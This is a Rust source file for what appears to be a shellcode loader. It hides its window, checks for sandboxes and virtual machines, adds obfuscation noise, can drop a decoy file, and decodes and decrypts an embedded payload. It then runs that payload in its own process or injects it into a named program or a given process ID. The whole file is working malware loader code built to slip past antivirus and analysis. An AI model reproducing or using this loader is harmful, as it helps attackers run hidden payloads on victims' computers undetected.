#![windows_subsystem = "windows"]
mod forgery;
mod guard;
mod utils;
use utils::obfuscation_noise;
mod exec;
mod decrypt;
mod alloc_mem;

#[cfg(any(feature = "pattern2", feature = "pattern3"))]
mod target;

use rustcrypt_ct_macros::obf_lit;
use decrypt::decrypt;
use exec::exec;
use std::process;
use base64::engine::general_purpose::STANDARD;
use base64::Engine;
const ENCRYPT_B64: &'static [u8] = include_bytes!("encrypt.bin");

fn base64_decode_payload() -> Option<Vec<u8>> {
    // Decode base64 from the embedded constant
    let raw = std::str::from_utf8(ENCRYPT_B64).ok()?;
    let decoded = STANDARD.decode(raw.trim()).ok()?;
    // New format: return decoded bytes (x||c2||hash1||c1) - detailed validation is performed by the executor
    Some(decoded)
}

fn main() {
    #[cfg(feature = "sandbox")]
    guard::guard_vm();

    obfuscation_noise();

    #[cfg(feature = "with_forgery")]
    forgery::bundle::bundlefile();

    #[cfg(feature = "base64_decode")]
    let decrypted_data = match base64_decode_payload() {
            Some(d) => d,
            None => process::exit(1),
    };
    
    obfuscation_noise();

    unsafe {
        let (shellcode_ptr, _shellcode_len) = match decrypt(&decrypted_data) {
            Ok(p) => p,
            Err(e) => {
                println!("{} {}", obf_lit!("Failed to decrypt:"), e);
                process::exit(1);
            }
        };
        
        obfuscation_noise();

        #[cfg(feature = "pattern1")]
        if let Err(e) = exec(shellcode_ptr) {
            println!("{} {}", obf_lit!("Failed to execute:"), e);
            process::exit(1);
        }
        
        #[cfg(feature = "pattern2")] 
        {
            let target_program = String::from_utf8(target::TARGET_PROGRAM.clone()).unwrap();
            if let Err(e) = exec(shellcode_ptr, _shellcode_len, &target_program) {
                println!("{} {}", obf_lit!("Failed to execute:"), e);
                process::exit(1);
            }
        }
        
        #[cfg(feature = "pattern3")]
        {
            let pid = target::TARGET_PID;
            if let Err(e) = exec(shellcode_ptr, _shellcode_len, pid as usize) {
                println!("{} {}", obf_lit!("Failed to execute:"), e);
                process::exit(1);
            }
        }
        
    }
}